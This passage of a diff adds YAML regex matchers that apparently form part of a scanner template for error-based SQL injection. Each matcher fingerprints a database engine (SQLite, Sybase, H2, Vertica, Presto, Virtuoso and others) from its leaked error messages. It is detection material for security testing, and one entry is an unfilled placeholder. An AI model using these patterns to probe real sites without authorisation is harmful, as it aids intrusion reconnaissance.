+        regex:
+          - "SQLite/JDBCDriver"
+          - "SQLite\\.Exception"
+          - "(Microsoft|System)\\.Data\\.SQLite\\.SQLiteException"
+          - "Warning.*?\\W(sqlite_|SQLite3::)"
+          - "\\[SQLITE_ERROR\\]"
+          - "SQLite error \\d+:"
+          - "sqlite3.OperationalError:"
+          - "SQLite3::SQLException"
+          - "org\\.sqlite\\.JDBC"
+          - "Pdo[./_\\\\]Sqlite"
+          - "SQLiteException"
+
+      - type: regex
+        name: SAPMaxDB
+        regex:
+          - "SQL error.*?POS([0-9]+)"
+          - "Warning.*?\\Wmaxdb_"
+          - "DriverSapDB"
+          - "-3014.*?Invalid end of SQL statement"
+          - "com\\.sap\\.dbtech\\.jdbc"
+          - "\\[-3008\\].*?: Invalid keyword or missing delimiter"
+
+      - type: regex
+        name: Sybase
+        regex:
+          - "Warning.*?\\Wsybase_"
+          - "Sybase message"
+          - "Sybase.*?Server message"
+          - "SybSQLException"
+          - "Sybase\\.Data\\.AseClient"
+          - "com\\.sybase\\.jdbc"
+
+      - type: regex
+        name: Ingres
+        regex:
+          - "Warning.*?\\Wingres_"
+          - "Ingres SQLSTATE"
+          - "Ingres\\W.*?Driver"
+          - "com\\.ingres\\.gcf\\.jdbc"
+
+      - type: regex
+        name: FrontBase
+        regex:
+          - "Exception (condition )?\\d+\\. Transaction rollback"
+          - "com\\.frontbase\\.jdbc"
+          - "Syntax error 1. Missing"
+          - "(Semantic|Syntax) error \\[1-4\\]\\d{2}\\."
+
+      - type: regex
+        name: HSQLDB
+        regex:
+          - "Unexpected end of command in statement \\["
+          - "Unexpected token.*?in statement \\["
+          - "org\\.hsqldb\\.jdbc"
+
+      - type: regex
+        name: H2
+        regex:
+          - "org\\.h2\\.jdbc"
+          - "\\[42000-192\\]"
+
+      - type: regex
+        name: MonetDB
+        regex:
+          - "![0-9]{5}![^\\n]+(failed|unexpected|error|syntax|expected|violation|exception)"
+          - "\\[MonetDB\\]\\[ODBC Driver"
+          - "nl\\.cwi\\.monetdb\\.jdbc"
+
+      - type: regex
+        name: ApacheDerby
+        regex:
+          - "Syntax error: Encountered"
+          - "org\\.apache\\.derby"
+          - "ERROR 42X01"
+
+      - type: regex
+        name: Vertica
+        regex:
+          - ", Sqlstate: (3F|42).{3}, (Routine|Hint|Position):"
+          - "/vertica/Parser/scan"
+          - "com\\.vertica\\.jdbc"
+          - "org\\.jkiss\\.dbeaver\\.ext\\.vertica"
+          - "com\\.vertica\\.dsi\\.dataengine"
+
+      - type: regex
+        name: Mckoi
+        regex:
+          - "com\\.mckoi\\.JDBCDriver"
+          - "com\\.mckoi\\.database\\.jdbc"
+          - "&lt;REGEX_LITERAL&gt;"
+
+      - type: regex
+        name: Presto
+        regex:
+          - "com\\.facebook\\.presto\\.jdbc"
+          - "io\\.prestosql\\.jdbc"
+          - "com\\.simba\\.presto\\.jdbc"
+          - "UNION query has different number of fields: \\d+, \\d+"
+
+      - type: regex
+        name: Altibase
+        regex:
+          - "Altibase\\.jdbc\\.driver"
+
+      - type: regex
+        name: MimerSQL
+        regex:
+          - "com\\.mimer\\.jdbc"
+          - "Syntax error,[^\\n]+assumed to mean"
+
+      - type: regex
+        name: CrateDB
+        regex:
+          - "io\\.crate\\.client\\.jdbc"
+
+      - type: regex
+        name: Cache
+        regex:
+          - "encountered after end of query"
+          - "A comparison operator is required here"
+
+      - type: regex
+        name: RaimaDatabaseManager
+        regex:
+          - "-10048: Syntax error"
+          - "rdmStmtPrepare\\(.+?\\) returned"
+
+      - type: regex
+        name: Virtuoso
+        regex:
+          - "SQ074: Line \\d+:"
+          - "SR185: Undefined procedure"
+          - "SQ200: No table "
+          - "Virtuoso S0002 Error"
+          - "\\[(Virtuoso Driver|Virtuoso iODBC Driver)\\]\\[Virtuoso Server\\]"
